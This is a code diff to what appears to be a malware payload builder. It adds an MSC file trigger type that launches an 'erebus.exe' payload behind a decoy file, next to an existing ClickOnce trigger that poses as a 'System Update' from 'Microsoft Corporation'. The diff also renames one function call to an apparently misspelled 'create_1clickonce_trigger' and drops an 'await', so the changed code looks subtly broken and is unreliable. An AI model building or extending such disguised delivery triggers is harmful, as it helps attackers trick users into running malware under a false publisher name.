@@ -390,7 +390,7 @@ appdomain (self)""",
             name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "ClickOnce"],
+            choices=["LNK", "BAT", "MSI", "ClickOnce", "MSC"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -409,6 +409,7 @@ appdomain (self)""",
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
             ]
         ),
 
@@ -422,6 +423,7 @@ appdomain (self)""",
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
             ]
         ),
 
@@ -3132,12 +3134,19 @@ static size_t key_len = sizeof(key);
                                 decoy_file=decoy_file
                             )
                         case "ClickOnce":
-                            trigger_path = await create_clickonce_trigger(
+                            trigger_path = await create_1clickonce_trigger(
                                 payload_exe="erebus.exe",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file,
                                 app_name="System Update",
                                 app_publisher="Microsoft Corporation"
+                            )
+                        
+                        case "MSC":
+                            trigger_path = create_msc_explorer_trigger(
+                                payload_exe="erebus.exe",
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file
                             )
 
                     if trigger_path:
